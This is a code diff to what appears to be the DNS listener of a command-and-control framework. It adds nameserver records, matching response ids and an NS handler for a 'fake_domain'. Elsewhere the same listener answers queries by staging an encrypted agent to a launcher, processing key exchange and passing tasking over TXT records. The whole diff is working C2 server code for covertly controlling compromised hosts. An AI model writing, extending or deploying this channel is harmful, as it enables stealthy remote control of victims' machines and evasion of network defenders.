@@ -550,6 +550,12 @@ def send_message(packets=None):
             an=DNSRR(rrname=str(reply_hostname), type='A', rdata=reply_ipaddr, ttl=1234))
         sock.sendto(bytes(reply), reply_addr_tuple)
 
+    def send_a_record_reply_id(self, sock, reply_hostname, reply_ipaddr, reply_addr_tuple, reply_id):
+        reply = DNS(
+            id=reply_id,ancount=1, qr=1,
+            an=DNSRR(rrname=str(reply_hostname), type='A', rdata=reply_ipaddr, ttl=1234))
+        sock.sendto(bytes(reply), reply_addr_tuple)
+        
     def send_txt_record_reply(self, sock, reply_hostname, reply_ipaddr, reply_addr_tuple):
         print "send_txt_record_reply host: {}".format(reply_hostname)
         reply = DNS(
@@ -745,9 +751,9 @@ def send_message(packets=None):
                         # TODO: wrap ^ in a routing packet?
                         self.send_payload_via_txt(hostname, sock, encryptedAgent, addr, txtstoptransfer)
 
-    def send_ns_response(reply_hostname, reply_ipaddr, reply_addr_tuple):
+    def send_ns_response(self, reply_hostname, reply_ipaddr, reply_addr_tuple, sock, reply_id):
         reply = DNS(
-            ancount=1, qr=1,
+            id=reply_id,ancount=1, qr=1,
             an=DNSRR(rrname=str(reply_hostname), type='NS', rdata=reply_ipaddr, ttl=1234))
         sock.sendto(bytes(reply), reply_addr_tuple)
     
@@ -767,6 +773,10 @@ def send_message(packets=None):
         ipswitchatotxt = listenerOptions['IPSwitchAtoTXT']['Value']
         ipack = listenerOptions['IPACK']['Value']
         ipeof = listenerOptions['IPEOF']['Value']
+        ipns1 = listenerOptions['IPNS1']['Value']
+        ipns2 = listenerOptions['IPNS2']['Value']
+        ns1hostname = listenerOptions['NS1Hostname']['Value']
+        ns2hostname = listenerOptions['NS2Hostname']['Value']
         stageonehostname = listenerOptions['StageOneHostname']['Value']
         stagetwohostname = listenerOptions['StageTwoHostname']['Value']
         stagethreehostname = listenerOptions['StageThreeHostname']['Value']
@@ -802,8 +812,10 @@ def send_message(packets=None):
                     #print "Received hostname {}".format(host)
                     if dns[DNSQR].qtype == 1:
                         print "DNS query of type A recv'd"
+                        if host.startswith(ns1hostname):
+                            self.send_a_record_reply_id(sock, host, ipns1, addr, dns.id)
                         # Stage 1 (Trigger download of stager to launcher)
-                        if host.startswith(stageonehostname):
+                        elif host.startswith(stageonehostname):
                             print "[STAGE 1]"
                             stageone_results = self.trigger_staging(sock, host, ipstagetolauncher, addr)
                         # Stage 3 (Process client DH key) 
@@ -842,10 +854,8 @@ def send_message(packets=None):
                             self.process_tasking_txt(host, sock, tasking_results, addr, ipack, txtstoptransfer)
                     elif dns[DNSQR].qtype == 2:
                         # NS request recvd
-                        if host.startswith(ns1hostname):
-                            self.send_ns_respone(hostname, ipns1, addr)
-                        elif host.startswith(ns2hostname):
-                            self.send_ns_respone(hostname, ipns2, addr)
+                        if host.startswith(fake_domain):
+                            self.send_ns_response(host, ns1hostname + '.' + fake_domain, addr, sock, dns.id)
                     else:
                         self.default_response()
         except (KeyboardInterrupt, SystemExit):
